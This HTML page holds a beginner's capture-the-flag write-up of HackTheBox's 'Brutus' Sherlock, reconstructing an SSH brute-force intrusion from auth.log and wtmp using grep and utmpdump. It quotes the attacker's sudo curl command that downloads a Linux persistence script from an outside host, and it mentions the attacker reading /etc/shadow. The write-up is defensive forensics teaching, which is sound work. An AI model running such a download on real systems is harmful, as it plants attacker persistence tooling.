      <h1>Brutus &ndash; <em>HackTheBox</em> / Sherlocks</h1>
      <div class="hero-sub">
        <span>CTF Writeup</span>
        <span>Log Analysis</span>

<main class="layout">

  <div class="intro-prose">
    <p>Learning cybersecurity can be tricky, but CTF (Capture the Flag) challenges make it much easier by letting you practice in a safe environment that feels like the real thing. One of these challenges is called <em>Brutus</em>, found on HackTheBox. It sits in the Sherlock category and is rated <em>very easy</em>, making it perfect for beginners.</p>
    <p>In this challenge you are given two files to work with. The first is <em>auth.log</em>, a plain text file that records every login attempt, session event, and sudo command on the system &mdash; essentially a timeline of everything that happened. The second is <em>wtmp</em>, a binary file that tracks user sessions and cannot be read directly like a text file. To make sense of it, we use <em>utmpdump</em>, a standard Linux tool from the util-linux package that converts the binary content into a human-readable format. Together these two files give us everything we need to reconstruct the attacker&rsquo;s actions from start to finish.</p>
  </div>

  <div class="section-heading"><h2 id="preparation">Preparation</h2><div class="section-line"></div></div>

  <div class="step-list">
    <div class="step"><div class="step-icon">01</div><div class="step-text">Download <em>Brutus.zip</em> from HackTheBox. Before extracting, preview its contents:
<div class="code-block">unzip -l Brutus.zip<button class="copy-btn" onclick="copyCode(this)">COPY</button></div><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="Brutus.zip contents" class="screenshot"/><figcaption>Picture 1: Brutus.zip contents &mdash; auth.log and wtmp listed</figcaption></figure></div></div>

    <div class="step"><div class="step-icon">02</div><div class="step-text">Extract the archive using <em>7-Zip</em> with the password found on the HackTheBox website:
<div class="code-block">7z x Brutus.zip<button class="copy-btn" onclick="copyCode(this)">COPY</button></div><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="Brutus.zip extracted using 7-Zip" class="screenshot"/><figcaption>Picture 2: Brutus.zip extracted using 7-Zip</figcaption></figure></div></div>

    <div class="step"><div class="step-icon">03</div><div class="step-text">Before diving in, confirm the file types. <em>auth.log</em> is plain text (usable with grep and awk), while <em>wtmp</em> is binary and needs utmpdump:
<div class="code-block">file auth.log wtmp<button class="copy-btn" onclick="copyCode(this)">COPY</button></div><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="file types confirmed" class="screenshot"/><figcaption>Picture 3: auth.log identified as ASCII text, wtmp identified as binary data &mdash; confirming which tool to use for each file</figcaption></figure></div></div>

  </div>

  <div class="section-heading"><h2 id="analysis">Analysis</h2><div class="section-line"></div></div>

<div class="task-card"><div class="task-header"><div class="task-number">T1</div><div class="task-question">Analyzing <em>auth.log</em>, can you identify the IP address used by the attacker to carry out a brute force attack?</div></div><div class="task-body"><p>A repeated IP in failed login entries alone is a weak indicator &mdash; a legitimate user could simply be mistyping their password. The indicator gains weight when combined with two additional factors: the volume (210 failed attempts from <em>65.2.161.68</em>) and the timeframe (~19 attempts per second over 11 seconds). When correlated &mdash; a single source IP, a high volume of failed attempts (210), and a rapid request rate (~19 attempts per second) &mdash; these indicators collectively suggest activity consistent with automated tooling rather than normal user behavior.</p><div class="code-block">grep "Failed password" auth.log | grep -oE 'from [0-9.]+' | awk '{print $2}' | sort | uniq -c | sort -rn<button class="copy-btn" onclick="copyCode(this)">COPY</button></div><p>The result shows a notable outlier &mdash; <em>65.2.161.68</em> accounts for 210 failed login attempts within 11 seconds. At approximately 19 requests per second, that rate is not consistent with manual input, which further supports the indication of automated tooling.</p><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="grep result showing 210 attempts from 65.2.161.68" class="screenshot"/><figcaption>Picture 4: 65.2.161.68 responsible for 210 failed login attempts &mdash; highest count indicates brute force origin</figcaption></figure><div class="answer-box"><span class="answer-label">Answer</span><span class="answer-value">65.2.161.68</span></div></div></div>
<div class="task-card"><div class="task-header"><div class="task-number">T2</div><div class="task-question">The brute force attempts were successful and the attacker gained access to an account on the server. What is the username of this account?</div></div><div class="task-body"><p>To identify successful logins, filter the log for accepted password events:</p><div class="code-block">grep "Accepted password" auth.log<button class="copy-btn" onclick="copyCode(this)">COPY</button></div><p>The output shows four accepted password events &mdash; three for <em>root</em> and one for <em>cyberjunkie</em> &mdash; all originating from 65.2.161.68. The first accepted root login appears at 06:31:40, but that session disconnects within the same second. This is consistent with a brute-force tool validating credentials before disconnecting. The actual interactive root session opens later at 06:32:44.</p><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="Accepted password events in auth.log" class="screenshot"/><figcaption>Picture 5: First successful root authentication at 06:32:44; the 06:31:40 hit is the brute-force tool&rsquo;s validation drop, not an interactive session</figcaption></figure><div class="answer-box"><span class="answer-label">Answer</span><span class="answer-value">root</span></div></div></div>
<div class="task-card"><div class="task-header"><div class="task-number">T3</div><div class="task-question">Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session. The login time will be different from the authentication time and can be found in the <em>wtmp</em> artifact.</div></div><div class="task-body"><p>This task asks specifically for the <em>wtmp</em> value, not the <em>auth.log</em> value. <em>auth.log</em> records the moment sshd accepted the password. <em>wtmp</em> records when the terminal was actually allocated to the user. These two events are one second apart &mdash; 06:32:44 in auth.log vs 06:32:45 in wtmp &mdash; and that gap is exactly why forensic analysts check both sources.</p><div class="code-block">utmpdump wtmp<button class="copy-btn" onclick="copyCode(this)">COPY</button></div><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="wtmp parsed via utmpdump" class="screenshot"/><figcaption>Picture 6: wtmp parsed via utmpdump &mdash; root session opened from 65.2.161.68 at 06:32:45</figcaption></figure><div class="answer-box"><span class="answer-label">Answer</span><span class="answer-value">2024-03-06 06:32:45</span></div></div></div>
<div class="task-card"><div class="task-header"><div class="task-number">T4</div><div class="task-question">SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the root account?</div></div><div class="task-body"><p>Once the attacker's interactive session started, the operating system assigned it a session number. The specific line to look for is logged by <em>systemd-logind</em>: <em>systemd-logind[411]: New session 37 of user root</em>. That tells you both the source process and the session number &mdash; useful for correlating events across log files in future investigations.</p><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="Root session 37 assigned" class="screenshot"/><figcaption>Picture 7: Root session 37 opened at 06:32:44 following successful password authentication from 65.2.161.68</figcaption></figure><div class="answer-box"><span class="answer-label">Answer</span><span class="answer-value">37</span></div></div></div>
<div class="task-card"><div class="task-header"><div class="task-number">T5</div><div class="task-question">The attacker added a new user as part of their persistence strategy and gave this new account higher privileges. What is the name of this account?</div></div><div class="task-body"><p>Search for user management events in auth.log:</p><div class="code-block">grep -E "useradd|usermod|groupadd" auth.log<button class="copy-btn" onclick="copyCode(this)">COPY</button></div><p>At 06:34:18 a new group and user called <em>cyberjunkie</em> were created. At 06:35:15 that user was added to the <em>sudo</em> group, granting full administrative privileges.</p><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="cyberjunkie user created" class="screenshot"/><figcaption>Picture 8: Backdoor account cyberjunkie created at 06:34:18 &mdash; added to sudo group at 06:35:15</figcaption></figure><div class="answer-box"><span class="answer-label">Answer</span><span class="answer-value">cyberjunkie</span></div></div></div>
<div class="task-card"><div class="task-header"><div class="task-number">T6</div><div class="task-question">What is the MITRE ATT&amp;CK sub-technique ID used for persistence?</div></div><div class="task-body"><p>Navigate to <em>attack.mitre.org</em> &rarr; Enterprise Matrix &rarr; Persistence &rarr; Create Account &rarr; Local Account to find the correct sub-technique ID for creating a local user as a persistence mechanism.</p><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="MITRE ATT&CK T1136.001" class="screenshot"/><figcaption>Picture 9: MITRE ATT&amp;CK T1136.001 &mdash; Local Account creation technique identified</figcaption></figure><div class="answer-box"><span class="answer-label">Answer</span><span class="answer-value">T1136.001</span></div></div></div>
<div class="task-card"><div class="task-header"><div class="task-number">T7</div><div class="task-question">What time did the attacker's first SSH session end according to auth.log?</div></div><div class="task-body"><p>The session started at 06:32:45. At 06:37:24 the connection ends &mdash; the full session teardown sequence is logged at 06:37:24, ending with Removed session 37.</p><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="Session disconnect at 06:37:24" class="screenshot"/><figcaption>Picture 10: Attacker session disconnect and logout from root at 06:37:24</figcaption></figure><div class="answer-box"><span class="answer-label">Answer</span><span class="answer-value">2024-03-06 06:37:24</span></div></div></div>
<div class="task-card"><div class="task-header"><div class="task-number">T8</div><div class="task-question">The attacker logged into their backdoor account and used elevated privileges to download a script. What is the full command executed using sudo?</div></div><div class="task-body"><p>At 06:37:34 a new session was created for <em>cyberjunkie</em>. Filter for sudo activity to see what commands they ran with elevated privileges:</p><div class="code-block">grep "sudo:" auth.log | grep COMMAND<button class="copy-btn" onclick="copyCode(this)">COPY</button></div><p>The output shows that at 06:39:38 they downloaded an external script using <em>curl</em>.</p><figure class="screenshot-wrap"><img src="data:image/png;base64," alt="Cyberjunkie sudo commands" class="screenshot"/><figcaption>Picture 11: Cyberjunkie executes privileged commands via sudo &mdash; reading /etc/shadow and downloading a script</figcaption></figure><div class="answer-box"><span class="answer-label">Answer</span><span class="answer-value">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span></div></div></div>
  <div class="conclusion">
    <h2 id="conclusion">Conclusion</h2>
    <p>This was my first HackTheBox Sherlock challenge, and I was surprised by how much you can learn from a single simple task. Analyzing the <em style="color:var(--orange)">auth.log</em> and <em style="color:var(--orange)">wtmp</em> files showed me how you can trace every step an attacker takes &mdash; from brute-force attempts all the way to creating a backdoor account and downloading scripts. The most important takeaway for me was that system logs provide a reliable record of system activity, which can be used to reconstruct attacker behavior. When someone breaks into a system, they almost always leave a trace, and our job is to find it. If you are just getting started with cybersecurity, Brutus is a perfect starting point &mdash; not too difficult, but it gives you the feeling that you are doing something real.</p>
  </div>

<script>

  function copyCode(btn) {
    const block = btn.parentElement;
    const code  = block.innerText.replace(/COPY|COPIED/g, '').trim();
    navigator.clipboard.writeText(code).then(() => {
      btn.textContent = 'COPIED';
      btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
    });
  }

</script>
